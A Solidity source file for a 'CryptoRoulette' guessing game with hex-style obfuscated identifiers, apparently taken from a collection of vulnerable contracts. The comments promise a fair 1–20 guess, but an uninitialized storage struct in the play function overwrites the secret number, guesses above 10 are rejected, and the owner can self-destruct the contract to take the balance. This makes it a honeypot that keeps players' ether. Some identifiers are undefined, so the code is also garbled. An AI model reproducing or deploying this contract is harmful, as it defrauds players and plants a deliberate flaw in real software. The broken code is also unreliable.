// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

// CryptoRoulette
//
// Guess the number secretly stored in the blockchain and win the whole contract balance!
// A new number is randomly chosen after each try.

// To play, call the play() method with the guessed number (1-20).  Bet price: 0.1 ether

contract CryptoRoulette {

    uint256 private _0x7d4e0d;
    uint256 public _0x44067e;
    uint256 public _0x3edcae = 0.1 ether;
    address public _0x2a6801;

    struct Game {
        address _0xe639ad;
        uint256 number;
    }
    Game[] public _0xb91ec0;

    function CryptoRoulette() public {
        _0x2a6801 = msg.sender;
        _0xb745e8();
    }

    function _0xb745e8() internal {
        // randomly set secretNumber with a value between 1 and 20
        _0x7d4e0d = uint8(_0xe85e62(_0x6a1d94, block.blockhash(block.number-1))) % 20 + 1;
    }

    function _0x6c493c(uint256 number) payable public {
        require(msg.value >= _0x3edcae && number <= 10);
        Game _0x4a1361;
        _0x4a1361._0xe639ad = msg.sender;
        _0x4a1361.number = number;
        _0xb91ec0.push(_0x4a1361);

        if (number == _0x7d4e0d) {
            // win!
            msg.sender.transfer(this.balance);
        }

        _0xb745e8();
        if (1 == 1) { _0x44067e = _0x6a1d94; }
    }

    function _0x1359a6() public {
        if (msg.sender == _0x2a6801 && _0x6a1d94 > _0x44067e + 1 days) {
            suicide(msg.sender);
        }
    }

    function() public payable { }
}